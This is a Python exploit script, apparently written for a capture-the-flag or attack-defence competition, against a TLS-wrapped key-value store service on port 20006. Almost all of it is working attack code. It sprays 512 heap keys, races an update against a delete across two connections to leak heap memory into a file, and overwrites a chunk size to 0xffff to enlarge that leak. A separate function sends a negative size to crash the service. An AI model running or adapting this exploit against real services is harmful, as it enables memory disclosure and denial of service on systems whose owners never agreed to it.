'''
the vulnerability is at s command, function gather_data
the u command isn't documented in h command, it seems useful because it can be
blocked.

race condition on update vs. get?
update checks whether there's already enough space for value, so decrease won't do anything.

update vs delete?
'''

import time
import re
from socket import *
from tlslite.api import *

PORT = 20006


class Connection(object):
    def __init__(self, ip):
        self.s = create_connection((ip, PORT))
        self.s = TLSConnection(self.s)
        self.s.handshakeClientCert()

        banner = self.readline()

    def readline(self):
        res = []
        while True:
            c = self.s.recv(1)
            if c == b'':
                break
            res.append(c)
            if c == b'\n':
                break
        return b''.join(res)

    def close(self):
        self.s.close()
    
    def send(self, data):
        self.s.send(data)


def leak(ip):
    con1 = Connection(ip)
    con2 = Connection(ip)

    # consolidate
    con1.send(b'X\n')
    print(con1.readline())
    con1.send(b's A %d\n' % 0x1000)
    con1.send(b'A' * 0x1000)
    print(con1.readline())
    con1.send(b'd A\n')
    print(con1.readline())

    # allocate dummies
    print('dummies')
    dummies = [b'dummy_%08x' % i for i in range(512) ]
    payload = b'B' * 8
    for dummy in dummies:
        con1.send(b's %s %d\n' % (dummy, len(payload)))
        con1.send(payload)
        con1.readline()
    print('dummies done')

    # increase median (realloc), hang con1
    median = dummies[len(dummies) // 2]
    con1.send(b'u %s %d\n' % (median, 0x4000))
    con1.send(b'A' * (0x4000 - 4))

    # sleep to see if bp hit
    print('update sleep')
    time.sleep(1)

    # delete median
    con2.send(b'd %s\n' % median)
    print('con2', con2.readline())

    # create new keys
    print('new_keys')
    new_keys = [b'new_key_%08x' % i for i in range(512)]
    for new_key in new_keys:
        # size 32 to avoid hitting the freed data struct
        con2.send(b's %s 32\n' % new_key)
        con2.send(b'C' * 32)
        con2.readline()
    print('new_keys done')

    # change median length
    con1.send(b'\0' * 4)
    print('con1', con1.readline())

    # read new keys
    for new_key in new_keys:
        con2.send(b'g %s\n' % new_key)
        line = con2.readline()
        size = int(line.decode().split()[2])
        leaked_data = con2.s.recv(size)
        if size != 32:
            print(line)
            print('leak_data len', len(leaked_data))
            overriding_key = new_key
            break
    
    print('clean')
    for key_name in set(dummies) - {overriding_key}:
        con2.send(b'd %s\n' % key_name)
        con2.readline()

    # read after clean
    print('re-leak')
    con2.send(b'g %s\n' % overriding_key)
    line = con2.readline()
    size = int(line.decode().split()[2])
    leaked_data = con2.s.recv(size)

    if 1:
        # update data
        # match = re.search(b'[\x11\x10]\0\0\0(.{4})\x20\0\0\0', leaked_data)
        match = re.search(b'\x11\0\0\0(.{4})\x20\0\0\0', leaked_data)
        match_start = match.start()

        new_data = bytearray(leaked_data)
        # new_data[match_start + 4:match_start + 4 + 4] = b'EEEE'
        new_data[match_start + 8:match_start + 8 + 4] = b'\xff\xff\x00\x00'
        new_data = bytes(new_data)[:match.end()]

        # overflow
        con1.send(b'u %s %d\n' % (overriding_key, len(new_data)))
        con1.send(new_data)
        print(con1.readline())

        # find overriden key
        for new_key in new_keys:
            con2.send(b'g %s\n' % new_key)
            line = con2.readline()
            size = int(line.decode().split()[2])
            leaked_data = con2.s.recv(size)
            if size == 0xffff:
                print(line)
                print('leak_data len', len(leaked_data))
                victim_key = new_key
                break
        
        print(overriding_key, victim_key, match)

    print('closing')
    time.sleep(1)

    con1.close()
    con2.close()

    print('write leak')
    open('leaked.bin', 'wb').write(leaked_data)

    return


def trigger_crash(con):
    v = b'A' * (0x3c - 0x30) + b'BBBB'
    con.s.send(b's foobar %d\n' % (-(0x1e + 0x3c - 0x20)))
    # self.s.send(b's foobar %d\n' % (-(0x1e + 0x3c - 0x20)))
    con.s.send(v)


def main():
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument('ip')
    args = parser.parse_args()
    ip = args.ip

    # leak
    leak(ip)
    return

    con = Connection(args.ip)
    trigger_crash(con)
    con.close()

if __name__ == '__main__':
    main()

